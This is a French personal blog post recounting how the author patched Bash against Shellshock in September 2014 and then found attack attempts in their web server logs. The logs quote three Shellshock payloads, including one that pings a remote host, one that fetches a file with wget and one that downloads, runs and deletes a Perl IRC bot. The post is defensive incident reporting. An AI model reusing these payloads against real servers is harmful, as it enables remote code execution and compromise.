---
layout: post
title: Shellshock, c'est passé à un cheveu
tags: serveur bash
---

Retour à hier matin, jeudi 25/9 matin, 9h05, Paris, France.

Comme tous les jours, je rafraîchis mon aggrégateur RSS en marchant vers le métro, et je lis vite tous les titres pour pré-charger les articles à lire avant que je n'aie quasiment plus de connectivité en entrant dans les boîtes à sardine.

Sur Arstechnica, il y a l'article suivant [Bug in Bash shell creates big security hole on anything with \*nix in it](http://arstechnica.com/security/2014/09/bug-in-bash-shell-creates-big-security-hole-on-anything-with-nix-in-it/). *scroll* *scroll* *scroll* ... 5 secondes de lecture en diagonale, et je capte "exploitable à distance" et "pleins de manières de le déclencher" (web server, dhcp, login, etc etc).

C'est du lourd, et facile à déclencher : ça fait donc environ 10-12h que "c'est connu", il faut réagir très vite. *Si c'est pas déjà trop tard !*

# Patch et re-patch

Je m'arrête de marcher, histoire de garder du réseau. Je dégaine [ConnectBot](https://play.google.com/store/apps/details?id=org.connectbot) pour me connecter sur mon serveur chez OVH, puis sur mon serveur de fichier à domicile.

Cing minutes après, il est 9h14, et mes serveurs et VM sont patchées.

	Start-Date: 2014-09-25  09:14:53
	Commandline: apt-get dist-upgrade -y
	Upgrade: bash:amd64 (4.2+dfsg-0.1, 4.2+dfsg-0.1+deb7u1)
	End-Date: 2014-09-25  09:15:04

A noter que j'ai commencé par les serveurs web, les articles reprenant l'utilisation d'appels CGI comme exemple principal : logique, c'est le point d'entrée le plus "facilement accessible".

Je continue mon chemin et ma journée en pensant "*job's done*" ([CVE-2014-6271](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271))

Retour à ce matin, vendredi 26/9, 9h20 à Paris. Comme hier, je rafraîchis ma brouette de RSS, et là *ouch*, un autre article [Arstechnica](http://arstechnica.com/security/2014/09/concern-over-bash-vulnerability-grows-as-exploit-reported-in-the-wild/). Ils n'ont pas l'habitude de faire plusieurs articles pour le plaisir, alors je l'ouvre tout de suite, ça sent mauvais...

Grand bien me fasse, j'apprends que :
- le premier patch n'a bouché le trou des variables d'environnement
- le premier bug est déjà massivement exploité dans la nature

Pire encore :
- il restait deux bugs de [Buffer overrun](https://fr.wikipedia.org/wiki/D%C3%A9passement_de_tampon) exploitables (qui viennent d'être patchés)
- je ne sais pas encore si ces deux bugs sont déjà exploités (plus compliqué que le premier, donc j'évalue *a priori* que non)

Il est 9h39, et à nouveau, mes serveurs et VM sont à jour (à nouveau, je commence par les serveurs web). Ca y est, c'est bon le deuxième bug sus-cité est lui aussi patché ([CVE-2014-7169](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169))

	Start-Date: 2014-09-26  09:39:04
	Upgrade: bash:amd64 (4.2+dfsg-0.1+deb7u1, 4.2+dfsg-0.1+deb7u3)
	End-Date: 2014-09-26  09:39:11

Bon, à nouveau, je me dis "ok, tout est sous contrôle". Mais je me dis aussi que c'est suffisement mauvais (et j'ai été suffisement lent hier) pour qu'il y ait un risque que j'aie été infecté... ça vaudrait la peine de regarder dans les logs.

# C'est passé à un cheveu ?

Après avoir lu dans le métro  les commentaires d'un article [slashdot](http://slashdot.org/story/14/09/25/1757208/flurry-of-scans-hint-that-bash-vulnerability-could-already-be-in-the-wild) sur le sujet, je décide de vérifier si mon/mes serveurs web ont été ciblés par les tentatives d'attaque du premier bug. 

A noter que mon serveur est un serveur personnel à très petit traffic, et donc il n'y a donc que peu de chance que je sois une cible "privilégiée", mais par contre il y a toutes les chances que je me prenne des tentatives.

Et clairement c'est le cas, j'ai reçu des attaques !

Le premier attaquant est arrivé 3h20 après que j'ai patché (*soit seulement 13h après l'article !*)

	89.207.135.125
	 [25/Sep/2014:12:37:09 +0200]
	  "GET /cgi-sys/defaultwebpage.cgi HTTP/1.0"
	   "() { :;};
	    /bin/ping -c 1 198.101.206.138"

Je n'étais déjà plus vulnérable, mais dans tous les cas sa première action a été de simplement vérifier si mon serveur était vulnérable (auquel cas j'aurais envoyé un ping à une de ses machines). C'est une bonne manière de "camoufler ses traces" : les machines vulnérables n'ont aucune information sur "ce qui se serait passé si j'étais vulnérable".

Le deuxième attaquant est arrivé 11h après que j'ai patché (24h après l'article)

	82.165.144.187
	 [25/Sep/2014:20:23:17 +0200]
	  "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1"
	   "() { :; };
	    /usr/bin/wget 82.165.144.187/bbbbbbbbbbbb"

Il a aussi tenté d'exploiter le premier bug, et pour ce faire a tenté de faire télécharger un fichier à mon serveur. Actuellement, j'obtiens une erreur 404, donc soit le fichier n'est plus disponible, soit l'attaquant utilise une requête HTTP plutôt qu'un ping pour recenser les cibles vulnérables.

Le troisième attaquant est arrivé ce matin, et était bien plus évolué et offensif que les précédent :

	63.131.141.125
	 [26/Sep/2014:04:15:47 +0200]
	  "GET /cgi-bin/php.fcgi HTTP/1.0"
	  "GET /fcgi-php/php HTTP/1.0"
	  "GET /cgi-bin/php.fcgi HTTP/1.0"
	  "GET /fcgi-php/php HTTP/1.0"
	   "() { :;};
	    /bin/bash -c \"
	     wget -O /var/tmp/wow1 208.118.61.44/wow1;
	     perl /var/tmp/wow1;
	     rm -rf /var/tmp/wow1\" "

Alors là : d'une part il essaie plusieurs URL afin de déclencher un process CGI, et d'autre part il essaie d'infecter sans phase de recensement : en effet, il upload un script perl, l'exécute et nettoie derrière lui. Pour information, le script Perl en question est visible sur [PasteBin](http://pastebin.com/wZb9L2CW).

Il s'agit d'un client IRC qui permet de 
- récupérer des infos système de la cible
- flooder/scanner les réseaux voisins
- de récupérer des fichiers du serveur
- envoyer du mail
- et bien sûr exécuter n'importe quel programme

Bref, simple mais efficace.

# La morale de cette histoire ?

J'ai eu de la chance... car il n'aura fallu que 13h après la publication d'une faille et que je voie de vraies tentatives arriver, et j'ai pu patcher entre temps.

Mon conseil ? 
- Même si on y comprend rien, se tenir informé permet de gagner du temps
- Toujours patcher son système *rapidement*, car "quelques heures" c'est déjà long !

Il existe des outils qui regardent si des mises à jour sont disponibles ([apticron](http://www.debian-administration.org/article/491/Automatic_package_update_nagging_with_apticron) par exemple) : ils sont extrêmement utiles pour être prévenus des upgrades dispo, **et** pour savoir s'il est urgent ou pas de les installer. C'est bien, mange-en !

